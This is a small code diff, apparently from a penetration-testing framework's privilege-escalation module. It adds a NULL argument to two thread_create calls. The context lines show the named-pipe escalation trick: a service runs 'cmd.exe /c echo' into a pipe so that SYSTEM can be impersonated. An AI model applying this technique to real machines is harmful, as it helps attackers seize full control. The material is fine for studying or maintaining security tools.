@@ -120,7 +120,7 @@ DWORD elevate_via_service_namedpipe( Remote * remote, Packet * packet )
 		
 		_snprintf_s( cServiceArgs, sizeof(cServiceArgs), MAX_PATH, "cmd.exe /c echo %s > %s", cpServiceName, cServicePipe );
 
-		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote );
+		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote, NULL );
 		if( !pThread )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. thread_create failed", ERROR_INVALID_HANDLE );
 
@@ -224,7 +224,7 @@ DWORD elevate_via_service_namedpipe2( Remote * remote, Packet * packet )
 		if( dwTotal != dwServiceLength )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. WriteFile hServiceFile failed", ERROR_BAD_LENGTH );
 
-		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote );
+		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote, NULL );
 		if( !pThread )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. thread_create failed", ERROR_INVALID_HANDLE );
 
